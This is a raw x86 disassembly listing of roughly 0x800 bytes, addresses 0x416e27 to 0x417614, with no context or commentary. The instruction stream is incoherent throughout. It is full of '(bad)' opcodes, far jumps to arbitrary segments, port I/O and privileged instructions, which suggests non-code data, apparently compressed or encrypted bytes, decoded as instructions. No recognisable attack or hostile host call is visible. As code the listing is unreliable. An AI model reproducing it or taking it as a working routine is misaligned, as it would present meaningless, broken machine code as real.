  416e27:	cmpxchg dh,dh
  416e2a:	inc    edi
  416e2b:	inc    esi
  416e2c:	loop   0x416e7b
  416e2e:	add    esi,0x10
  416e31:	fidivr DWORD PTR [esi+0x26]
  416e34:	ja     0x416e8d
  416e36:	inc    BYTE PTR ds:0x71a27c41
  416e3c:	or     eax,0xf5b4efb3
  416e41:	push   ds
  416e42:	je     0x416ec1
  416e44:	mov    ah,0xdf
  416e46:	sub    ch,al
  416e48:	mov    ds:0xae44a1a7,al
  416e4d:	pop    ebx
  416e4e:	(bad)  
  416e4f:	mov    ecx,0x841b0dce
  416e54:	in     eax,0xf7
  416e56:	or     al,0xa3
  416e58:	fild   QWORD PTR [eax]
  416e5a:	push   eax
  416e5b:	pop    edi
  416e5c:	jge    0x416de4
  416e5e:	push   ds
  416e5f:	and    dl,BYTE PTR [eax]
  416e61:	sub    DWORD PTR [edx],0x2a
  416e64:	add    BYTE PTR [esi-0x4c56b4a9],cl
  416e6a:	xchg   esp,eax
  416e6b:	cwde   
  416e6c:	push   edx
  416e6d:	pop    ds
  416e6e:	xor    ah,BYTE PTR [ebp+0x10eebb3f]
  416e74:	dec    edx
  416e75:	adc    BYTE PTR [ecx-0x7bc82830],0x24
  416e7c:	into   
  416e7d:	dec    ecx
  416e7e:	mov    eax,0xdde51de1
  416e83:	ret    
  416e84:	lods   al,BYTE PTR ds:[esi]
  416e85:	mov    ch,dh
  416e87:	rol    DWORD PTR [edi*8+0x16333ff2],0x0
  416e8f:	repnz xor cl,BYTE PTR [ebx]
  416e92:	mov    ch,0x7c
  416e94:	add    ah,0xc4
  416e97:	into   
  416e98:	xchg   edi,eax
  416e99:	jo     0x416e8a
  416e9b:	xlat   BYTE PTR ds:[ebx]
  416e9c:	add    cl,BYTE PTR [ebx-0x6e]
  416e9f:	add    dh,ah
  416ea1:	movzx  eax,al
  416ea4:	and    al,0x7a
  416ea6:	aad    0xdc
  416ea8:	loop   0x416ead
  416eaa:	dec    edx
  416eab:	addr16 add eax,0x666be7f6
  416eb1:	cmp    dl,0x53
  416eb4:	add    al,BYTE PTR [ebx+0x481ede3f]
  416eba:	std    
  416ebb:	pop    ecx
  416ebc:	mov    eax,0x6a20caf4
  416ec1:	push   ecx
  416ec2:	pushf  
  416ec3:	retf   0x1737
  416ec6:	and    DWORD PTR [edx],esp
  416ec8:	retf   
  416ec9:	jae    0x416efe
  416ecb:	mov    ebx,0x1a6919f3
  416ed0:	xor    DWORD PTR [ebx],edi
  416ed2:	sbb    BYTE PTR [ecx],0xca
  416ed5:	int    0xe0
  416ed7:	loope  0x416f48
  416ed9:	jecxz  0x416f20
  416edb:	push   eax
  416edc:	clc    
  416edd:	jmp    0x9f2e:0xd76c6486
  416ee4:	dec    esi
  416ee5:	adc    cl,BYTE PTR [edx-0x643c7a9c]
  416eeb:	call   0xe9e8:0xf915eb1e
  416ef2:	iret   
  416ef3:	xor    al,0xec
  416ef5:	push   cs
  416ef6:	add    ch,BYTE PTR [esi+0x25]
  416ef9:	imul   ebx,DWORD PTR [ecx-0x14117929],0x2de45e6b
  416f03:	adc    BYTE PTR [esi-0x6a26ef78],dl
  416f09:	add    BYTE PTR [edi-0x48],bh
  416f0c:	pop    edi
  416f0d:	outs   dx,DWORD PTR ds:[esi]
  416f0e:	sbb    dh,cl
  416f10:	xchg   ecx,eax
  416f11:	mov    DWORD PTR [eax+0x42c4a079],ebx
  416f17:	stos   DWORD PTR es:[edi],eax
  416f18:	push   ds
  416f19:	pop    ss
  416f1a:	ja     0x416f28
  416f1c:	mov    cl,0x41
  416f1e:	xchg   ebp,eax
  416f1f:	or     DWORD PTR [eax],esp
  416f21:	nop
  416f22:	push   eax
  416f23:	call   0x13f9:0xe79fb7b3
  416f2a:	out    0x26,al
  416f2c:	mov    DWORD PTR [esi],eax
  416f2e:	cld    
  416f2f:	js     0x416ede
  416f31:	call   0xdc25d833
  416f36:	and    ch,cl
  416f38:	dec    eax
  416f39:	in     al,dx
  416f3a:	mov    al,0x43
  416f3c:	mov    ebx,0x7d57b262
  416f41:	jb     0x416f06
  416f43:	pop    eax
  416f44:	aas    
  416f45:	inc    esi
  416f46:	xlat   BYTE PTR ds:[ebx]
  416f47:	pop    esi
  416f48:	cmp    al,0xca
  416f4a:	or     al,0xaf
  416f4c:	add    eax,0xb4c33e28
  416f51:	dec    esi
  416f52:	adc    ah,BYTE PTR [ebp+eiz*1-0x2728adbd]
  416f59:	push   cs
  416f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f5b:	push   0x281106fc
  416f60:	rol    DWORD PTR [ebx],1
  416f62:	or     edx,DWORD PTR [esi+0x55]
  416f65:	das    
  416f66:	jmp    FWORD PTR [esi-0x13]
  416f69:	adc    DWORD PTR [ebp+0x28],ecx
  416f6c:	xor    DWORD PTR [edx+0x2ba8ed68],0xffffffec
  416f73:	jnp    0x416f77
  416f75:	cmp    BYTE PTR [ecx-0xf],bl
  416f78:	aaa    
  416f79:	add    eax,DWORD PTR [edx+0x4c]
  416f7c:	jg     0x8258ad94
  416f82:	aad    0xd3
  416f84:	sbb    DWORD PTR [edx+0x67],0xffffffa6
  416f88:	stos   DWORD PTR es:[edi],eax
  416f89:	fiadd  DWORD PTR [bp+0x39c6]
  416f8e:	sub    al,0x12
  416f90:	mov    edi,0xeccfb77e
  416f95:	jnp    0x416fcd
  416f97:	xchg   edx,eax
  416f98:	cmp    edi,esp
  416f9a:	or     eax,0x2214709b
  416f9f:	ret    0x1fac
  416fa2:	test   DWORD PTR [esi-0x37],ecx
  416fa5:	push   eax
  416fa6:	and    BYTE PTR [esi-0x5dcf7b8d],al
  416fac:	leave  
  416fad:	bound  ebp,QWORD PTR [eax-0x2d]
  416fb0:	popf   
  416fb1:	mov    gs,ecx
  416fb3:	mov    ds,WORD PTR [eax+0x14fa9b42]
  416fb9:	push   0x610d519c
  416fbe:	out    dx,eax
  416fbf:	xor    al,0xaa
  416fc1:	or     eax,0x8533afda
  416fc6:	push   ebp
  416fc7:	bound  eax,QWORD PTR [ebx]
  416fc9:	fwait
  416fca:	mov    eax,0x9a790cb3
  416fcf:	ret    
  416fd0:	lock jl 0x416fdb
  416fd3:	pop    ss
  416fd4:	lds    ebp,FWORD PTR [ecx-0x74]
  416fd7:	xor    BYTE PTR [ebp-0x3c],dl
  416fda:	mov    esi,0xdd345629
  416fdf:	mov    ds,WORD PTR [esp+ecx*8]
  416fe2:	gs jmp 0x417064
  416fe5:	inc    ebx
  416fe6:	mov    al,0x5d
  416fe8:	xchg   DWORD PTR [esi],ebp
  416fea:	loop   0x416fba
  416fec:	and    ecx,DWORD PTR [edx-0x16]
  416fef:	sub    eax,0x26ff8898
  416ff4:	push   ebp
  416ff5:	dec    eax
  416ff6:	sar    DWORD PTR [ebp+0x1dafe930],cl
  416ffc:	in     eax,dx
  416ffd:	pop    es
  416ffe:	xor    eax,0x4420ccf5
  417003:	imul   ecx,DWORD PTR [esi-0x1c7435cd],0xffffffe2
  41700a:	or     BYTE PTR [ebp+0x7d2af978],al
  417010:	out    dx,eax
  417011:	arpl   WORD PTR [edx-0x32],cx
  417014:	imul   ebx,DWORD PTR [esi+eiz*8+0x5648b07e],0x3a8b6a14
  41701f:	inc    esp
  417020:	out    0x8,al
  417022:	mov    edx,0x5b04f66b
  417027:	out    0x1e,eax
  417029:	das    
  41702a:	cwde   
  41702b:	ret    0x69f0
  41702e:	popf   
  41702f:	bound  eax,QWORD PTR [edx]
  417031:	ret    0xeff7
  417034:	jmp    0xd572:0xb9ee01ed
  41703b:	call   ebx
  41703d:	pusha  
  41703e:	nop
  41703f:	sbb    al,0x6e
  417041:	xchg   edi,eax
  417042:	dec    esi
  417043:	nop
  417044:	jg     0x417017
  417046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417047:	pop    ss
  417048:	jecxz  0x416fd8
  41704a:	jecxz  0x416fcd
  41704c:	xchg   ebp,eax
  41704d:	and    BYTE PTR [esp+ebp*8],cl
  417050:	xchg   edx,eax
  417051:	dec    edi
  417052:	mov    esi,0x1564da50
  417057:	adc    esp,DWORD PTR [edx-0x378bc230]
  41705d:	fmul   DWORD PTR [ebp-0x3f]
  417060:	adc    DWORD PTR [edi+0x3c],esp
  417063:	add    DWORD PTR [esi],esi
  417065:	loopne 0x4170ca
  417067:	popa   
  417068:	rol    DWORD PTR [ebp-0x2e],1
  41706b:	and    DWORD PTR [edx+ebp*2-0x58ee5c0],edi
  417072:	pop    esi
  417073:	xchg   BYTE PTR ds:[esi+0x4e88665d],al
  41707a:	xchg   esi,eax
  41707b:	es scas al,BYTE PTR es:[edi]
  41707d:	adc    al,0xb
  41707f:	or     eax,0xf251f5f2
  417084:	adc    ah,BYTE PTR [esi-0x54]
  417087:	mov    dl,0xdc
  417089:	sub    DWORD PTR [ebx+ecx*2],edi
  41708c:	outs   dx,BYTE PTR ds:[esi]
  41708d:	ret    0x1e86
  417090:	daa    
  417091:	push   eax
  417092:	loopne 0x417050
  417094:	sbb    eax,0xeea21e56
  417099:	call   0x22010a62
  41709e:	ds mov cl,0x95
  4170a1:	(bad)  
  4170a2:	xchg   ecx,eax
  4170a3:	(bad)  
  4170a4:	int    0xef
  4170a6:	shl    al,0x53
  4170a9:	add    DWORD PTR [edx-0xa289c0c],esi
  4170af:	fist   DWORD PTR [ebp+ebx*8-0x2c690fbf]
  4170b6:	ins    BYTE PTR es:[edi],dx
  4170b7:	les    eax,FWORD PTR [esi-0x7e323291]
  4170bd:	out    0x10,eax
  4170bf:	mov    al,ds:0x4b11717e
  4170c4:	or     ch,ch
  4170c6:	(bad)  
  4170c8:	or     ecx,eax
  4170ca:	mov    bl,0x5f
  4170cc:	push   es
  4170cd:	call   0xad939c9b
  4170d2:	xchg   ebp,eax
  4170d3:	js     0x417087
  4170d5:	dec    ebx
  4170d6:	mov    edx,0x58daa6e2
  4170db:	xchg   BYTE PTR [esi-0x3e482c15],bh
  4170e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170e2:	ret    0xc643
  4170e5:	aam    0xc7
  4170e7:	data16 aas 
  4170e9:	sbb    ch,0xa9
  4170ec:	fld    QWORD PTR [ebp+0x7e5a4547]
  4170f2:	and    esi,ebx
  4170f4:	shl    DWORD PTR [edx-0x7e],cl
  4170f7:	sar    DWORD PTR [ebp+0x109f8323],0x1
  4170fe:	inc    eax
  4170ff:	ds (bad) 
  417101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417102:	sahf   
  417103:	adc    al,0x50
  417105:	adc    DWORD PTR [ecx],edx
  417107:	mov    ds:0xb8d861e,al
  41710c:	ins    WORD PTR es:[edi],dx
  41710e:	push   ebp
  41710f:	mov    edi,0xa2735e4
  417114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417115:	xor    DWORD PTR [ebp-0x75],ebx
  417118:	(bad)  
  417119:	fs ja  0x417180
  41711c:	cmp    al,0xd7
  41711e:	and    dh,bl
  417120:	shl    DWORD PTR [eax+eax*4+0x2d8f08dd],0x83
  417128:	sub    esp,esp
  41712a:	pusha  
  41712b:	imul   eax,DWORD PTR [bx+si],0x29b97381
  417132:	ja     0x417158
  417134:	mov    BYTE PTR [edx-0x54],al
  417137:	xchg   BYTE PTR ds:0x17181c8f,ch
  41713d:	in     al,dx
  41713e:	sub    DWORD PTR [ebp+0x68],eax
  417141:	xor    eax,0x3f07b696
  417146:	mov    ebp,0x6eefe524
  41714b:	add    al,0xa0
  41714d:	push   eax
  41714e:	mov    ch,0x7e
  417150:	es fwait
  417152:	call   0x2275fd43
  417157:	mov    cl,0x80
  417159:	in     al,dx
  41715a:	push   edi
  41715b:	lahf   
  41715c:	fnsave [edx-0x5b]
  41715f:	xchg   ecx,eax
  417160:	and    al,0x29
  417162:	(bad)  
  417163:	hlt    
  417164:	jmp    0x4190:0x3c7733eb
  41716b:	call   0x78a1:0xcacf20ef
  417172:	(bad)  
  417173:	ins    DWORD PTR es:[edi],dx
  417174:	ret    0x22ec
  417177:	jne    0x41719e
  417179:	inc    ebx
  41717a:	or     ch,BYTE PTR [edi]
  41717c:	sub    DWORD PTR [esi],0x67
  41717f:	sub    eax,0xa7b31ea6
  417184:	xchg   edx,eax
  417185:	paddsb mm3,mm5
  417188:	cmp    eax,0xe74b9284
  41718d:	or     eax,esi
  41718f:	xor    al,0x31
  417191:	adc    al,0x42
  417193:	aam    0xd0
  417195:	les    ebp,FWORD PTR [edi-0xf955a8d]
  41719b:	aaa    
  41719c:	div    DWORD PTR [ebp-0x2ff14ace]
  4171a2:	pop    ebx
  4171a3:	je     0x417158
  4171a5:	fsubr  QWORD PTR [ebx-0x52]
  4171a8:	sub    al,0x1a
  4171aa:	int    0x19
  4171ac:	pop    edi
  4171ad:	aad    0x1a
  4171af:	pushf  
  4171b0:	xchg   ecx,eax
  4171b1:	mov    eax,ds:0x94d290d2
  4171b6:	arpl   WORD PTR [eax-0x60c4aad6],si
  4171bc:	dec    esi
  4171bd:	or     dh,ah
  4171bf:	cmp    al,0xdd
  4171c1:	cld    
  4171c2:	(bad)  
  4171c4:	call   0xc8bf8092
  4171c9:	xchg   ebp,eax
  4171ca:	leave  
  4171cb:	push   ecx
  4171cc:	push   ebp
  4171cd:	jb     0x4171e9
  4171cf:	or     eax,0x8c5fd2cf
  4171d4:	and    al,BYTE PTR [esi-0x4d3db359]
  4171da:	aad    0x9c
  4171dc:	scas   al,BYTE PTR es:[edi]
  4171dd:	pop    ss
  4171de:	data16 not BYTE PTR [edi+0x13]
  4171e2:	cmp    DWORD PTR ds:0xe3bce9fc,edx
  4171e8:	mov    al,ds:0x272d73c5
  4171ed:	sti    
  4171ee:	lods   al,BYTE PTR ds:[esi]
  4171ef:	or     ebp,DWORD PTR [edi-0x1c3cc7b5]
  4171f5:	jb     0x417203
  4171f7:	int    0xf8
  4171f9:	jle    0x417191
  4171fb:	clc    
  4171fc:	inc    ebp
  4171fd:	mov    eax,0x6ee7da61
  417202:	push   ebp
  417203:	xor    BYTE PTR [edi-0x5c59676f],bh
  417209:	cmp    al,0x4
  41720b:	adc    edx,ebp
  41720d:	iret   
  41720e:	pop    edx
  41720f:	scas   eax,DWORD PTR es:[edi]
  417210:	das    
  417211:	mov    esp,0x9de45fd
  417216:	sbb    bh,al
  417218:	shl    DWORD PTR [ebp+0x7c3be223],cl
  41721e:	cmp    al,BYTE PTR [ecx]
  417220:	sahf   
  417221:	jns    0x417201
  417223:	outs   dx,DWORD PTR ds:[esi]
  417224:	mov    ch,0xa6
  417226:	(bad)  
  417228:	leave  
  417229:	cwde   
  41722a:	cmp    al,0x23
  41722c:	scas   al,BYTE PTR es:[edi]
  41722d:	mov    cl,0xbf
  41722f:	retf   
  417230:	hlt    
  417231:	enter  0x7c83,0x76
  417235:	lea    edx,[esi]
  417237:	and    al,0xf9
  417239:	sbb    ah,BYTE PTR [eax+ecx*4+0x36]
  41723d:	or     DWORD PTR [eax+ebx*1],esi
  417240:	bound  ax,DWORD PTR [ebp+eax*1-0x33]
  417245:	lods   al,BYTE PTR fs:[esi]
  417247:	nop
  417248:	icebp  
  417249:	scas   al,BYTE PTR es:[edi]
  41724a:	dec    ebp
  41724b:	or     DWORD PTR [eax+0x72],ebx
  41724e:	shl    DWORD PTR [eax+0x74e5c2fa],cl
  417254:	das    
  417255:	xor    cl,BYTE PTR [edi]
  417257:	xchg   edi,eax
  417258:	dec    esi
  417259:	pop    esp
  41725a:	jmp    0x211:0x9977e889
  417261:	and    bl,BYTE PTR [eax]
  417263:	xchg   ebp,eax
  417264:	aas    
  417265:	and    edi,DWORD PTR [ecx+0x37]
  417268:	pop    esp
  417269:	mov    gs,WORD PTR [ecx]
  41726b:	(bad)  
  41726c:	stos   BYTE PTR es:[edi],al
  41726d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726e:	das    
  41726f:	sar    DWORD PTR [ebx+0x55b93e4f],1
  417275:	xchg   edi,eax
  417276:	cli    
  417277:	out    0xdf,al
  417279:	sti    
  41727a:	(bad)  
  41727b:	mov    dh,0x16
  41727d:	sub    ah,bl
  41727f:	cmp    BYTE PTR [edi-0x10],al
  417282:	je     0x417252
  417284:	test   al,ch
  417286:	stos   BYTE PTR es:[edi],al
  417287:	lahf   
  417288:	stos   DWORD PTR es:[edi],eax
  417289:	and    eax,0x14e93f72
  41728e:	jns    0x417236
  417290:	mov    eax,0x52cdd437
  417295:	add    eax,0xeee7b576
  41729a:	xrelease xchg DWORD PTR [ebx+0x60],eax
  41729e:	mov    edx,0x8fb3a1f0
  4172a3:	fimul  WORD PTR [esp+eax*1]
  4172a6:	cmp    al,0x1e
  4172a8:	ins    BYTE PTR es:[edi],dx
  4172a9:	and    edx,DWORD PTR [esi-0x7120bc14]
  4172af:	out    dx,eax
  4172b0:	fdivr  DWORD PTR ds:0x2f2039e
  4172b6:	mov    BYTE PTR [esp+eiz*2],al
  4172b9:	in     al,0x4a
  4172bb:	jne    0x417323
  4172bd:	lods   al,BYTE PTR ds:[esi]
  4172be:	jmp    0x41731d
  4172c0:	hlt    
  4172c1:	retf   0x6d14
  4172c4:	retf   0x11f5
  4172c7:	shl    eax,1
  4172c9:	add    dl,BYTE PTR [ecx]
  4172cb:	mov    ds:0x30d8da7f,al
  4172d0:	clc    
  4172d1:	cwde   
  4172d2:	loopne 0x4172e8
  4172d4:	mov    ah,0xf1
  4172d6:	jns    0x417284
  4172d8:	inc    eax
  4172d9:	loop   0x41734a
  4172db:	lods   al,BYTE PTR ds:[esi]
  4172dc:	int    0x9a
  4172de:	in     al,0x9a
  4172e0:	call   0xa0e6:0x3ee56976
  4172e7:	mov    ebx,0xc2b82290
  4172ec:	retf   
  4172ed:	sbb    ebx,DWORD PTR [ecx]
  4172ef:	(bad)
  4172f3:	cld    
  4172f4:	sbb    DWORD PTR [ebx-0x48666a7a],0x0
  4172fb:	imul   eax,DWORD PTR [esi],0xfffffffc
  4172fe:	sub    dh,BYTE PTR [ebx+0x591839bf]
  417304:	mov    dh,0xfd
  417306:	std    
  417307:	sub    BYTE PTR [ebp-0x65876fbf],dl
  41730d:	cs adc al,0x80
  417310:	enter  0xbfc2,0xdc
  417314:	imul   esi,DWORD PTR [edx-0x65436cc3],0x680464b2
  41731e:	and    BYTE PTR [ebx],dl
  417320:	sub    eax,0xbc10fe4f
  417325:	sar    BYTE PTR [edx],0x20
  417328:	les    edi,FWORD PTR [eax-0x3a5adf04]
  41732e:	imul   esi,DWORD PTR [ebx],0xffffffc8
  417331:	daa    
  417332:	das    
  417333:	in     al,dx
  417334:	shl    ah,0x33
  417337:	mov    dh,BYTE PTR [ebx]
  417339:	or     eax,0x61198ccd
  41733e:	out    dx,al
  41733f:	cmp    esp,esp
  417341:	iret   
  417342:	mov    ch,0xde
  417344:	cmp    al,0x55
  417346:	in     al,0xc4
  417348:	dec    edi
  417349:	mov    dl,0x47
  41734b:	pop    edx
  41734c:	fisub  WORD PTR [ebx-0x635d1a19]
  417352:	(bad)  
  417353:	sub    bh,dh
  417355:	(bad)  
  417356:	sti    
  417357:	mov    esi,0xbff28c6d
  41735c:	mov    esp,0x8aa80c2e
  417361:	sahf   
  417362:	mov    esi,0xf2094ee4
  417367:	mov    esp,esp
  417369:	mov    bh,BYTE PTR [edx+0x257d4481]
  41736f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417370:	(bad)  
  417371:	aad    0xf
  417373:	add    al,0x62
  417375:	ja     0x41737e
  417377:	jge    0x417355
  417379:	pop    edx
  41737a:	arpl   dx,sp
  41737c:	dec    edx
  41737d:	mov    dl,0x3d
  41737f:	xor    eax,esp
  417381:	int3   
  417382:	nop
  417383:	sbb    eax,0x13d8f854
  417388:	stc    
  417389:	xlat   BYTE PTR ds:[ebx]
  41738a:	xor    eax,0xe81bba64
  41738f:	daa    
  417390:	outs   dx,DWORD PTR ds:[esi]
  417391:	inc    eax
  417392:	(bad)  
  417393:	scas   eax,DWORD PTR es:[edi]
  417394:	into   
  417395:	xchg   esi,eax
  417396:	ja     0x417348
  417398:	sub    al,0x70
  41739a:	aad    0xfe
  41739c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41739d:	push   esi
  41739e:	(bad)  
  41739f:	sti    
  4173a0:	scas   al,BYTE PTR es:[edi]
  4173a1:	xor    al,BYTE PTR [esi]
  4173a3:	daa    
  4173a4:	or     eax,0xb613e410
  4173a9:	jne    0x41733f
  4173ab:	iret   
  4173ac:	push   esp
  4173ad:	icebp  
  4173ae:	mov    al,ds:0xef5a6996
  4173b3:	mov    dl,0x5f
  4173b5:	and    ebp,esi
  4173b7:	das    
  4173b8:	push   es
  4173b9:	js     0x41738c
  4173bb:	sub    BYTE PTR [edx-0x5d],bl
  4173be:	ja     0x4173b1
  4173c0:	push   0xd25f69f1
  4173c5:	mov    bl,0x6d
  4173c7:	cdq    
  4173c8:	addr16 dec ebx
  4173ca:	xchg   esi,eax
  4173cb:	jno    0x417409
  4173cd:	test   eax,0x3e26fca
  4173d2:	call   0x7478174c
  4173d7:	push   esp
  4173d8:	sub    eax,0xe7ddaa28
  4173dd:	loop   0x417399
  4173df:	xor    al,0x38
  4173e1:	cwde   
  4173e2:	inc    eax
  4173e3:	mov    DWORD PTR [edx-0x3c8cfc5f],esi
  4173e9:	daa    
  4173ea:	and    esi,edx
  4173ec:	pop    eax
  4173ed:	cmc    
  4173ee:	sbb    eax,0xef8e5fd0
  4173f3:	xchg   edx,eax
  4173f4:	push   edx
  4173f5:	and    dl,0x89
  4173f8:	inc    esi
  4173f9:	outs   dx,BYTE PTR ds:[esi]
  4173fa:	cdq    
  4173fb:	ss loop 0x4173ff
  4173fe:	out    dx,al
  4173ff:	and    ebp,DWORD PTR [eax]
  417401:	mov    cl,0x80
  417403:	idiv   BYTE PTR [esi]
  417405:	sub    eax,0x3a99cd7b
  41740a:	stos   BYTE PTR es:[edi],al
  41740b:	loopne 0x41742a
  41740d:	xor    DWORD PTR [ebp+0x2],edi
  417410:	cwde   
  417411:	test   al,0xe4
  417413:	or     BYTE PTR [esi],ah
  417415:	adc    DWORD PTR [edi],ecx
  417417:	in     al,0x8
  417419:	sbb    BYTE PTR [eax-0x41],dh
  41741c:	(bad)  
  41741d:	in     eax,0x8b
  41741f:	mov    esp,DWORD PTR [ebx+eax*1+0x8]
  417423:	jle    0x417439
  417425:	and    ecx,ecx
  417427:	jmp    DWORD PTR [ebx-0x7555c889]
  41742d:	xlat   BYTE PTR ds:[ebx]
  41742e:	pusha  
  41742f:	in     eax,0x3f
  417431:	dec    ebp
  417432:	cmc    
  417433:	and    BYTE PTR [ecx+0xa],0x28
  417437:	add    cl,dh
  417439:	outs   dx,DWORD PTR ds:[esi]
  41743a:	jbe    0x41740e
  41743c:	or     BYTE PTR [esi+0x61],dh
  41743f:	xor    eax,edi
  417441:	jo     0x417405
  417443:	inc    edx
  417444:	mov    WORD PTR [edx-0x45],ds
  417447:	xor    eax,0xdc5e31f1
  41744c:	ds push ds
  41744e:	xchg   edi,eax
  41744f:	pop    ecx
  417450:	jno    0x417445
  417452:	das    
  417453:	into   
  417454:	lds    ebp,FWORD PTR [ebx+0x47]
  417457:	mov    ebx,0xc30ac2b6
  41745c:	(bad)  [ebx]
  41745e:	adc    al,0x46
  417460:	shl    edi,1
  417462:	jo     0x41740b
  417464:	xchg   esi,eax
  417465:	inc    edx
  417466:	nop
  417467:	ds sbb al,0x9c
  41746a:	xor    al,BYTE PTR [ebx+0x699b19b8]
  417470:	hlt    
  417471:	xlat   BYTE PTR ds:[ebx]
  417472:	stos   BYTE PTR es:[edi],al
  417473:	inc    edx
  417474:	mov    ch,0xc2
  417476:	adc    DWORD PTR ds:0x884ce3e8,esi
  41747c:	add    ebp,edx
  41747e:	loope  0x41741b
  417480:	stc    
  417481:	sbb    esp,DWORD PTR [ebp+eax*8-0x5d]
  417485:	push   ecx
  417486:	mov    ch,ah
  417488:	cmp    eax,0xf8929a5e
  41748d:	mov    ah,0x43
  41748f:	or     DWORD PTR ds:0x69a0eb0b,0xffffffcb
  417496:	push   cs
  417497:	mov    bl,BYTE PTR [ebx+0x527a77df]
  41749d:	push   ecx
  41749e:	xchg   ebp,eax
  41749f:	mov    eax,ds:0xbb5f6438
  4174a4:	aas    
  4174a5:	add    al,0xc5
  4174a7:	mov    eax,ds:0x9bff26dd
  4174ac:	xor    ch,cl
  4174ae:	mov    ch,0xb2
  4174b0:	sub    ebx,DWORD PTR [ecx-0x7c]
  4174b3:	and    ecx,DWORD PTR [ebx+0x58502f30]
  4174b9:	out    0x2b,al
  4174bb:	imul   ecx,DWORD PTR [eax],0xffffffec
  4174be:	push   esp
  4174bf:	xchg   edx,eax
  4174c0:	aas    
  4174c1:	cs or  eax,0xad51a587
  4174c7:	sub    eax,0x8c23d537
  4174cc:	and    BYTE PTR [esi],ah
  4174ce:	mov    al,ds:0x554d3ede
  4174d3:	pop    ebx
  4174d4:	jae    0x4174f8
  4174d6:	int    0xcd
  4174d8:	jmp    0x599e:0x9e90b141
  4174df:	dec    esi
  4174e0:	retf   0x1b68
  4174e3:	cmp    DWORD PTR [edi],esp
  4174e5:	or     DWORD PTR [eax],0xb447dfc2
  4174eb:	fsub   QWORD PTR [ebx+esi*1]
  4174ee:	add    BYTE PTR [eax-0x47741ba2],ch
  4174f4:	clc    
  4174f5:	sub    eax,0x42676490
  4174fa:	sar    esp,1
  4174fc:	jg     0x417521
  4174fe:	xchg   esp,eax
  4174ff:	mov    DWORD PTR ds:0x74ff04b5,ebp
  417505:	scas   al,BYTE PTR es:[edi]
  417506:	in     al,0xdb
  417508:	ins    DWORD PTR es:[edi],dx
  417509:	adc    ebp,edx
  41750b:	int    0x8b
  41750d:	and    DWORD PTR gs:[ecx+ebp*8],0x3b
  417512:	jne    0x41755b
  417514:	jbe    0x417553
  417516:	aam    0x0
  417518:	ins    DWORD PTR es:[edi],dx
  417519:	sub    edi,edi
  41751b:	xchg   esi,eax
  41751c:	mov    dh,0x65
  41751e:	jne    0x41758d
  417520:	pop    edi
  417521:	cdq    
  417522:	mov    edi,0xf324eee9
  417527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417528:	jle    0x417570
  41752a:	mov    ecx,0xfaad49a4
  41752f:	loop   0x41758b
  417531:	test   DWORD PTR [eax+0x13dc1d2b],ecx
  417537:	add    dl,BYTE PTR [edx]
  417539:	shr    DWORD PTR [ebx-0x4491d1be],1
  41753f:	cmp    DWORD PTR [ebx-0x49],edi
  417542:	push   ds
  417543:	mov    fs,WORD PTR [esi]
  417545:	cwde   
  417546:	push   ss
  417547:	and    ah,cl
  417549:	in     al,0xa0
  41754b:	mov    ebx,0xdd4c549d
  417550:	loop   0x4175a6
  417552:	(bad)  
  417553:	aam    0x57
  417555:	adc    BYTE PTR [eax-0x4f],dh
  417558:	jmp    0xa67f467d
  41755d:	je     0x41759e
  41755f:	pop    edx
  417560:	(bad)  [edx]
  417562:	mov    WORD PTR [eax],ds
  417564:	push   esp
  417565:	jle    0x417535
  417567:	cmc    
  417568:	sub    DWORD PTR [edx+0x6cc08db6],ebx
  41756e:	sbb    ebp,DWORD PTR [eax-0x22]
  417571:	lods   eax,DWORD PTR ds:[esi]
  417572:	jmp    0x41756c
  417574:	nop
  417575:	inc    esi
  417576:	dec    eax
  417577:	add    DWORD PTR [edx+0x9],0x83ddbd26
  41757e:	sub    BYTE PTR [esi],cl
  417580:	jl     0x41757b
  417582:	data16 mov dh,0xb5
  417585:	and    cl,BYTE PTR [ecx+0x74]
  417588:	stos   DWORD PTR es:[edi],eax
  417589:	push   ecx
  41758a:	add    bl,bh
  41758c:	lock adc al,0x33
  41758f:	enter  0xf202,0x97
  417593:	cdq    
  417594:	push   esp
  417595:	sub    eax,0x873428b7
  41759a:	cwde   
  41759b:	push   ebp
  41759c:	cli    
  41759d:	test   DWORD PTR [edx+ebx*8-0x4cb3573f],esi
  4175a4:	and    eax,0x5a77b54e
  4175a9:	bound  esp,QWORD PTR [esi]
  4175ab:	xchg   esi,eax
  4175ac:	or     bh,ch
  4175ae:	inc    esi
  4175af:	stc    
  4175b0:	add    edx,DWORD PTR [esi-0x41]
  4175b3:	enter  0xcb0,0x2d
  4175b7:	ror    bl,0x36
  4175ba:	inc    edi
  4175bb:	push   ebp
  4175bc:	mul    DWORD PTR [eax+0x66]
  4175bf:	sbb    ebx,esp
  4175c1:	(bad)  
  4175c2:	jle    0x417617
  4175c4:	push   esi
  4175c5:	mov    bh,0xfa
  4175c7:	in     al,0xfa
  4175c9:	jecxz  0x417582
  4175cb:	xor    DWORD PTR [edx+0x190a540d],ecx
  4175d1:	fld    TBYTE PTR [edi]
  4175d3:	sahf   
  4175d4:	int3   
  4175d5:	mov    al,0x69
  4175d7:	hlt    
  4175d8:	xchg   ecx,eax
  4175d9:	inc    ebp
  4175da:	test   BYTE PTR [ebp-0x41],al
  4175dd:	push   edx
  4175de:	pop    edx
  4175df:	cwde   
  4175e0:	cmp    edi,DWORD PTR [eax+eiz*2+0x22588d39]
  4175e7:	popf   
  4175e8:	retf   
  4175e9:	pop    ebx
  4175ea:	int    0x7b
  4175ec:	sbb    al,BYTE PTR [eax+ebp*1]
  4175ef:	lahf   
  4175f0:	stos   BYTE PTR es:[edi],al
  4175f1:	stc    
  4175f2:	fnstenv [eax+0x5f69a6b3]
  4175f8:	or     al,0x78
  4175fb:	dec    esi
  4175fc:	xchg   esi,eax
  4175fd:	jb     0x41766d
  4175ff:	sbb    al,0x17
  417601:	mov    edi,0xefd4c050
  417606:	sub    esp,eax
  417608:	call   0xe2954f8a
  41760d:	pop    ecx
  41760e:	mov    ecx,0x2a78895d
  417613:	ret    
  417614:	cld    
